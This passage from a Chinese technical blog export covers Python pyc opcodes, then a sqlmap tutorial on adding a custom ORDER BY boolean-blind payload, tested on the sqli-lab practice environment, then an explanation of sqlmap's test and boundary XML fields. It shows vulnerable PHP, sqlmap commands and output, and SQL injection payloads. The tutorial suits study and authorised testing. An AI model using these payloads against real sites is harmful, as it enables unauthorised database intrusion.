class=\"name\">freevars</span>&gt;</span></span><br><span class=\"line\">               <span class=\"tag\">&lt;<span class=\"name\">cellvars</span>&gt;</span> ()<span class=\"tag\">&lt;/<span class=\"name\">cellvars</span>&gt;</span></span><br><span class=\"line\">               <span class=\"tag\">&lt;<span class=\"name\">filename</span>&gt;</span> 'test.py'<span class=\"tag\">&lt;/<span class=\"name\">filename</span>&gt;</span></span><br><span class=\"line\">               <span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span> 'sayHello'<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">               <span class=\"tag\">&lt;<span class=\"name\">firstlineno</span>&gt;</span> 12<span class=\"tag\">&lt;/<span class=\"name\">firstlineno</span>&gt;</span></span><br><span class=\"line\">               <span class=\"tag\">&lt;<span class=\"name\">consts</span>&gt;</span></span><br><span class=\"line\">                  None</span><br><span class=\"line\">                  'hello,world'</span><br><span class=\"line\">               <span class=\"tag\">&lt;/<span class=\"name\">consts</span>&gt;</span></span><br><span class=\"line\">               <span class=\"tag\">&lt;<span class=\"name\">lnotab</span>&gt;</span> 0001<span class=\"tag\">&lt;/<span class=\"name\">lnotab</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">code</span>&gt;</span></span><br><span class=\"line\">         <span class=\"tag\">&lt;/<span class=\"name\">consts</span>&gt;</span></span><br><span class=\"line\">         <span class=\"tag\">&lt;<span class=\"name\">lnotab</span>&gt;</span> 06010902<span class=\"tag\">&lt;/<span class=\"name\">lnotab</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;/<span class=\"name\">code</span>&gt;</span></span><br><span class=\"line\">      ()</span><br><span class=\"line\">   <span class=\"tag\">&lt;/<span class=\"name\">consts</span>&gt;</span></span><br><span class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">lnotab</span>&gt;</span> 0c010602090513060901<span class=\"tag\">&lt;/<span class=\"name\">lnotab</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">code</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>可以看到，整个test.pyc就是一个嵌套的PyCodeObject结构的组合，对于每个函数，或者类的方法，都会生成一个对应的PyCodeObject结构，并且模块还会生成额外的一个PyCodeObject结构,pyc文件中一共保存了5个PyCodeObject结构：</p>\n<ul>\n<li>最外层的为模块test的PyCodeObject，其中的代码在import或者直接运行时会得到执行。</li>\n<li>在module的PyCodeObject中嵌套了add函数的PyCodeObject结构以及world类的PyCodeObject结构。</li>\n<li>在world类的PyCodeObject结构中，又嵌套了<strong>init</strong>方法和sayHello方法的PyCodeObject结构。</li>\n</ul>\n<h3 id=\"解析部分产生的opcode\"><a href=\"#解析部分产生的opcode\" class=\"headerlink\" title=\"解析部分产生的opcode\"></a>解析部分产生的opcode</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1           0 LOAD_CONST               0 (-1) #加载consts数组中索引为0处的值，这里为数值-1  </span><br><span class=\"line\">             3 LOAD_CONST               1 (None) #加载consts数组中索引为1处的值，这里为None  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">             6 IMPORT_NAME              0 (dis) #加载dis模块：names[0]即为&quot;dis&quot;  </span><br><span class=\"line\">             9 STORE_NAME               0 (dis) #将模块保存到一个dict中，这个dict专门用来保存局部变量的值，key为names[0],即&quot;dis&quot;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"> 2          12 LOAD_NAME                1 (True) #将names[1]，即True压栈。  </span><br><span class=\"line\">            15 STORE_NAME               2 (myglobal) #将栈顶的元素，即True保存到locals[&apos;myglobal&apos;]中,names[2]即为字符串&apos;myglobal&apos;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"> 4          18 LOAD_CONST               2 (&lt;code object add at 024E3B60, file &quot;test.py&quot;, line 4&gt;) #将consts[2]，即add函数的PyCodeObject压栈。  </span><br><span class=\"line\">            21 MAKE_FUNCTION            0 #通过add函数的PyCodeObject创建一个函数，并压入栈顶。  </span><br><span class=\"line\">            24 STORE_NAME               3 (add) #将创建的函数出栈并保存到locals[&apos;add&apos;]中  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"> 9          27 LOAD_CONST               3 (&apos;world&apos;) #consts[3],即&quot;world&quot;入栈  </span><br><span class=\"line\">            30 LOAD_CONST               5 (()) #consts[5],即空数组入栈  </span><br><span class=\"line\">            33 LOAD_CONST               4 (&lt;code object world at 024E3650, file &quot;test.py&quot;, line 9&gt;) #将consts[4]，即world的PyCodeObject入栈。  </span><br><span class=\"line\">            36 MAKE_FUNCTION            0 #创建函数  </span><br><span class=\"line\">            39 CALL_FUNCTION            0 #调用刚创建的函数，用于初始化类，会返回一个dict到栈顶，这个dict中保存了类的方法以及一些全局变量，  </span><br><span class=\"line\">                                        #具体的实现要看world类的PyCodeObject中的opcode  </span><br><span class=\"line\">            42 BUILD_CLASS               #创建类，注意BUILD_CLASS会用到栈中的三个对象，这里分别为：保存在dict中的类的信息，基类数组，这里为空数组(),类的名称：&quot;world&quot;  </span><br><span class=\"line\">            43 STORE_NAME               4 (world) #将类保存到locals[&apos;world&apos;]中  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">15          46 LOAD_NAME                4 (world)  </span><br><span class=\"line\">            49 CALL_FUNCTION            0  </span><br><span class=\"line\">            52 STORE_NAME               5 (w)  </span><br><span class=\"line\">#以上三行代码创建一个world对象  </span><br><span class=\"line\">16          55 LOAD_NAME                5 (w)  </span><br><span class=\"line\">            58 LOAD_ATTR                6 (sayHello)  </span><br><span class=\"line\">            61 CALL_FUNCTION            0  </span><br><span class=\"line\">#以上三行代码调用w.sayHello()  </span><br><span class=\"line\">            64 POP_TOP               </span><br><span class=\"line\">            65 LOAD_CONST               1 (None)  </span><br><span class=\"line\">            68 RETURN_VALUE</span><br></pre></td></tr></table></figure>\n","categories":["Python"],"tags":["PyCodeObject","opcode"]},{"title":"sqlmap使用之自定义payload","url":"http://www.beesfun.com/2017/03/31/sqlmap使用之自定义payload/","content":"<h2 id=\"为什么要自定义payload\"><a href=\"#为什么要自定义payload\" class=\"headerlink\" title=\"为什么要自定义payload\"></a>为什么要自定义payload</h2><p>sqlmap根据用户提供的<code>level</code>和<code>risk</code>参数决定发送SQL注入测试的payload的种类和数量。通常情况，sqlmap使用默认参数扫描时会存在很多注入扫描不出来的问题，这是因为默认情况下一些注入类型(如<code>order by</code>)是不会去扫描的，虽然用户可以通过提高level参数和risk参数，让sqlmap做更加全面的扫描，但是这种方式会发送大量的请求，影响扫描效率，而且risk参数过高还会带来损害数据库的风险，因此可以通过添加自定义的payload或者修改sqlmap提供的payload，优化扫描策略。</p>\n<p>自定义payload可以带来以下好处:</p>\n<ul>\n<li>提供针对性的扫描，同时保持sqlmap扫描的高效性(发送的请求少)</li>\n<li>针对已知的注入类型，做绕过测试，例如: 结合各种tamper脚本等</li>\n</ul>\n<a id=\"more\"></a>\n<h2 id=\"添加自定义payload\"><a href=\"#添加自定义payload\" class=\"headerlink\" title=\"添加自定义payload\"></a>添加自定义payload</h2><p>关于sqlmap生成payload的方式可以参见 <a href=\"/2017/03/30/sqlmap源码解析之test和boundary组合生成payload/\" title=\"sqlmap源码解析之test和boundary组合生成payload\">sqlmap源码解析之test和boundary组合生成payload</a>。</p>\n<p>使用 sqli-lab 实验环境，选取lesson 53做测试，核心代码为:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$id=$_GET[<span class=\"string\">'sort'</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($id))&#123;</span><br><span class=\"line\">    $sql=<span class=\"string\">\"SELECT * FROM users ORDER BY '$id'\"</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>显然, 这是order by类型的注入，而且还是字符型注入。另外看具体代码知道，这题为盲注类型。首先使用sqlmap做默认扫描</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -u &quot;http://sqli.loc/Less-52/?sort=1&quot; -p sort -v 2</span><br><span class=\"line\"></span><br><span class=\"line\">[14:21:19] [DEBUG] skipping test &apos;MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)&apos; because the level (4) is higher than the provided (1)</span><br><span class=\"line\"></span><br><span class=\"line\">sqlmap identified the following injection point(s) with a total of 93 HTTP(s) requests:</span><br><span class=\"line\">---</span><br><span class=\"line\">Parameter: sort (GET)</span><br><span class=\"line\">    Type: AND/OR time-based blind</span><br><span class=\"line\">    Title: MySQL &gt;= 5.0.12 AND time-based blind</span><br><span class=\"line\">    Payload: sort=1&apos; AND SLEEP(5) AND &apos;MAwe&apos;=&apos;MAwe</span><br><span class=\"line\">    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])</span><br><span class=\"line\">---</span><br></pre></td></tr></table></figure>\n<p>从上面的结果可以看出: 1. 默认<code>level=1</code>的情况下，sqlmap会忽略<code>ORDER BY</code>类型的测试。 2: sqlmap只发了93个请求，识别出了注入点，但是从title可以看出使用的payload并不是<code>ORDER BY</code>类型, 而且还是时间盲注,并不方便后续的数据获取。</p>\n<p>提高<code>level</code>参数为4，再次测试</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -u &quot;http://sqli.loc/Less-53/?sort=1&quot; -p sort -v 2 --level 4</span><br><span class=\"line\"></span><br><span class=\"line\">sqlmap identified the following injection point(s) with a total of 417 HTTP(s) requests:</span><br><span class=\"line\">---</span><br><span class=\"line\">Parameter: sort (GET)</span><br><span class=\"line\">    Type: boolean-based blind</span><br><span class=\"line\">    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause</span><br><span class=\"line\">    Payload: sort=1&apos; RLIKE (SELECT (CASE WHEN (1428=1428) THEN 1 ELSE 0x28 END))-- dtiw</span><br><span class=\"line\">    Vector: RLIKE (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE 0x28 END))</span><br><span class=\"line\">---</span><br></pre></td></tr></table></figure>\n<p>sqlmap总共发送了417次请求, 但识别注入点的payload为包含<code>ORDER BY</code>类型的payload. 那么我们可以自定义添加payload或者修改该payload的level值为1，这样批量扫描注入点为这种类型的站点，节约扫描时间。</p>\n<h3 id=\"自定义payload\"><a href=\"#自定义payload\" class=\"headerlink\" title=\"自定义payload\"></a>自定义payload</h3><p>在 <code>xml/payloads/boolean_blind.xml</code>文件后添加test节点如下:</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">test</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>AND boolean-based blind - WHERE or HAVING or ORDER BY OR GROUP BY clause<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">stype</span>&gt;</span>1<span class=\"tag\">&lt;/<span class=\"name\">stype</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">level</span>&gt;</span>1<span class=\"tag\">&lt;/<span class=\"name\">level</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">risk</span>&gt;</span>1<span class=\"tag\">&lt;/<span class=\"name\">risk</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">clause</span>&gt;</span>1,2,3<span class=\"tag\">&lt;/<span class=\"name\">clause</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">where</span>&gt;</span>1<span class=\"tag\">&lt;/<span class=\"name\">where</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">vector</span>&gt;</span>AND if([INFERENCE],[RANDNUM],(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS))<span class=\"tag\">&lt;/<span class=\"name\">vector</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">request</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">payload</span>&gt;</span>AND if([RANDNUM]=[RANDNUM],[RANDNUM],(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS))<span class=\"tag\">&lt;/<span class=\"name\">payload</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">request</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">response</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">comparison</span>&gt;</span>AND if([RANDNUM]=[RANDNUM1],[RANDNUM],(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS))<span class=\"tag\">&lt;/<span class=\"name\">comparison</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">response</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">test</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>识别结果如下，共292次请求，添加的payload成功识别。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -u http://sqli.loc/Less-53/?sort=1 -v 2</span><br><span class=\"line\"></span><br><span class=\"line\">sqlmap identified the following injection point(s) with a total of 292 HTTP(s) requests:</span><br><span class=\"line\">---</span><br><span class=\"line\">Parameter: sort (GET)</span><br><span class=\"line\">    Type: boolean-based blind</span><br><span class=\"line\">    Title: AND boolean-based blind - WHERE or HAVING or ORDER BY OR GROUP BY clause</span><br><span class=\"line\">    Payload: sort=1&apos; AND if(9984=9984,9984,(SELECT 9984 FROM INFORMATION_SCHEMA.PLUGINS)) AND &apos;WKRv&apos;=&apos;WKRv</span><br><span class=\"line\">    Vector: AND if([INFERENCE],[RANDNUM],(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS))</span><br><span class=\"line\"></span><br><span class=\"line\">    Type: AND/OR time-based blind</span><br><span class=\"line\">    Title: MySQL &gt;= 5.0.12 AND time-based blind</span><br><span class=\"line\">    Payload: sort=1&apos; AND SLEEP(5) AND &apos;rcfl&apos;=&apos;rcfl</span><br><span class=\"line\">    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])</span><br><span class=\"line\">---</span><br></pre></td></tr></table></figure>\n","categories":["Web安全"],"tags":["sqlmap"]},{"title":"sqlmap源码解析之test和boundary组合生成payload","url":"http://www.beesfun.com/2017/03/30/sqlmap源码解析之test和boundary组合生成payload/","content":"<h2 id=\"test和boundary组合生成payload\"><a href=\"#test和boundary组合生成payload\" class=\"headerlink\" title=\"test和boundary组合生成payload\"></a>test和boundary组合生成payload</h2><p>这部分主要梳理sqlmap生成payload的方式，sqlmap扫描规则文件位于<code>xml</code>文件夹中的<code>boundaries.xml</code>文件和<code>payloads</code>文件夹，payloads文件夹中存放了六种注入类型的xml文件。</p>\n<ul>\n<li>boolean_blind</li>\n<li>error_based</li>\n<li>inline_query</li>\n<li>stacked_queries</li>\n<li>time_blind</li>\n<li>union_query</li>\n</ul>\n<p>最终payload的生成方式为: <code>prefix</code> + <code>payload</code> + <code>comment</code> + <code>suffix</code>, 其中<code>prefix</code>和<code>suffix</code>由boundaries中的子节点<code>prefix</code>和<code>suffix</code>提供，<code>payload</code>和<code>comment</code>由payloads文件夹中的test的子节点<code>payload</code>和<code>comment</code>提供。</p>\n<a id=\"more\"></a>\n<h2 id=\"解析test\"><a href=\"#解析test\" class=\"headerlink\" title=\"解析test\"></a>解析test</h2><p>test节点的格式如下：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">test</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">stype</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">stype</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">level</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">level</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">risk</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">risk</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">clause</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">clause</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">where</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">where</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">vector</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">vector</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">request</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">payload</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">payload</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">comment</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">comment</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">char</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">char</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">columns</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">columns</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">request</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">response</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">comparison</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">comparison</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">grep</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">grep</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">time</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">time</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">union</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">union</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">response</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">details</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">dbms</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">dbms</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">dbms_version</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">dbms_version</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">os</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">os</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">details</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">test</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"title\"><a href=\"#title\" class=\"headerlink\" title=\"title\"></a>title</h3><p>当前测试Payload的标题，通过标题可以了解当前的注入类型以及测试的数据库类型</p>\n<h3 id=\"stype\"><a href=\"#stype\" class=\"headerlink\" title=\"stype\"></a>stype</h3><p>SQL注入的类型, 可能的值和代表的意义如下</p>\n<ul>\n<li>1: Boolean-based blind SQL injection</li>\n<li>2: Error-based queries SQL injection</li>\n<li>3: Inline queries SQL injection</li>\n<li>4: Stacked queries SQL injection</li>\n<li>5: Time-based blind SQL injection</li>\n<li>6: UNION query SQL injection</li>\n</ul>\n<h3 id=\"level\"><a href=\"#level\" class=\"headerlink\" title=\"level\"></a>level</h3><p>测试SQL注入的深度，共有5个级别，级别越高发送的请求数越多。这和boundary子节点level的含义是一致的</p>\n<ul>\n<li>1: Always (&lt;100 requests)</li>\n<li>2: Try a bit harder (100-200 requests)</li>\n<li>3: Good number of requests (200-500 requests)</li>\n<li>4: Extensive test (500-1000 requests)</li>\n<li>5: You have plenty of time (&gt;1000 requests)</li>\n</ul>\n<h3 id=\"risk\"><a href=\"#risk\" class=\"headerlink\" title=\"risk\"></a>risk</h3><p>测试payload破坏数据完整性的可能性。</p>\n<ul>\n<li>1: Low risk</li>\n<li>2: Medium risk</li>\n<li>3: High risk</li>\n</ul>\n<h3 id=\"clause-多个值用-分隔\"><a href=\"#clause-多个值用-分隔\" class=\"headerlink\" title=\"clause[多个值用,分隔]\"></a>clause[多个值用<code>,</code>分隔]</h3><p>payload在哪个字段位置生效, 这和boundary子节点clause的含义是一致的</p>\n<ul>\n<li>0: Always</li>\n<li>1: WHERE / HAVING</li>\n<li>2: GROUP BY</li>\n<li>3: ORDER BY</li>\n<li>4: LIMIT</li>\n<li>5: OFFSET</li>\n<li>6: TOP</li>\n<li>7: Table name</li>\n<li>8: Column name</li>\n<li>9: Pre-WHERE (non-query)</li>\n</ul>\n<h3 id=\"where-多个值用-分隔\"><a href=\"#where-多个值用-分隔\" class=\"headerlink\" title=\"where[多个值用,分隔]\"></a>where[多个值用<code>,</code>分隔]</h3><p>添加完整payload<code>&lt;prefix&gt; &lt;payload&gt;&lt;comment&gt; &lt;suffix&gt;</code>的地方, 这和boundary子节点where的含义是一致的</p>\n<ul>\n<li>1: Append the string to the parameter original value</li>\n<li>2: Replace the parameter original value with a negative random integer value and append our string</li>\n<li>3: Replace the parameter original value with our string</li>\n</ul>\n<h3 id=\"vector\"><a href=\"#vector\" class=\"headerlink\" title=\"vector\"></a>vector</h3><p>注入向量</p>\n<h3 id=\"request\"><a href=\"#request\" class=\"headerlink\" title=\"request\"></a>request</h3><p>注入测试发送的请求</p>\n<ul>\n<li><p>payload</p>\n<p>  测试使用的payload, 其中的<code>[RANDNUM]</code>，[<code>DELIMITER_STAR]</code>，<code>[DELIMITER_STOP]</code>分别代表着随机数值与字符, 扫描时会用对应的随机数替换掉。</p>\n</li>\n<li><p>comment</p>\n<p>  添加在payload后面的注释</p>\n</li>\n<li><p>char</p>\n<p> 在union注入测试中暴力破解列数所使用的字符</p>\n</li>\n<li><p>columns</p>\n<p>  在union注入测试中测试列的范围， 如<code>&lt;columns&gt;[COLSTART]-[COLSTOP]&lt;/columns&gt;</code></p>\n</li>\n</ul>\n<h3 id=\"response\"><a href=\"#response\" class=\"headerlink\" title=\"response\"></a>response</h3><p>从响应中识别是否成功注入</p>\n<ul>\n<li><p>comparison(布尔盲注)</p>\n<p>  应用比较算法，比较两次请求响应的不同，一次请求的payload使用request子节点中的<code>payload</code>, 另一次请求的payload使用response子节点中的<code>comparison</code></p>\n</li>\n<li><p>grep(报错注入)</p>\n<p>  响应中匹配的正则表达式</p>\n</li>\n<li><p>time(时间盲注和堆叠注入)</p>\n<p>  响应返回之前等待的时间(单位为秒)</p>\n</li>\n<li><p>union(union注入)</p>\n<p>  调用 unionTest()函数</p>\n</li>\n</ul>\n<h3 id=\"details\"><a href=\"#details\" class=\"headerlink\" title=\"details\"></a>details</h3><p>注入成功能得到的关于操作系统和数据库相关的信息</p>\n<ul>\n<li>dbms</li>\n</ul>\n<p>使用的数据库类型</p>\n<ul>\n<li>dbms_version</li>\n</ul>\n<p>数据库版本</p>\n<ul>\n<li>os</li>\n</ul>\n<p>运行数据库得操作系统</p>\n<h2 id=\"解析boundaries\"><a href=\"#解析boundaries\" class=\"headerlink\" title=\"解析boundaries\"></a>解析boundaries</h2><p>boundary节点的格式如下:</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">boundary</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">level</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">level</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">clause</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">clause</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">where</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">where</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">ptype</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">ptype</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">prefix</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">prefix</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">suffix</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">suffix</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">boundary</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>其中<code>level</code>, <code>clause</code>, <code>where</code>表示的含义和test节点中所表示的含义是一致的。</p>\n<h3 id=\"ptype\"><a href=\"#ptype\" class=\"headerlink\" title=\"ptype\"></a>ptype</h3><p>测试参数的类型</p>\n<ul>\n<li>1: Unescaped numeric</li>\n<li>2: Single quoted string</li>\n<li>3: LIKE single quoted string</li>\n<li>4: Double quoted string</li>\n<li>5: LIKE double quoted 